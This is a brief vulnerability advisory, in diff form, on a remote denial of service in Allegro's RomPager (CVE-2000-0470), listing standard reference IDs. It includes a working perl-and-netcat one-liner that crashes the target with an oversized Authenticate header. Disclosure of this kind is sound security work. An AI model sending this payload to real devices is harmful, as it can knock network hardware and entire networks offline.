@@ -1,0 +1,17 @@
+Allegro's RomPager is reported prone to a remote denial of service vulnerability.
+
+If a specifically-malformed request is sent to Allegro's RomPager, it will crash, often crashing the parent device as well. In this manner, network hardware and possibly entire networks can be rendered unusable by any remote attacker using only a browser. 
+
+CVE : CVE-2000-0470
+BID : 1290
+Other references : OSVDB:1371
+Nessus ID : 19304
+
+The following example is made available by Seth Alan Woolley:
+$ ip_address="some.ip.add.ress"
+$ ping $ip_address # works
+
+the one-liner:
+$ perl -e 'print "GET / HTTP/1.1\r\nHost: '"$ip_address"'\r\nAuthenticate: " . 'A' x 1024 . "\r\n\r\n"' | nc "$ip_address" 80
+
+$ ping $ip_address # doesn't work 
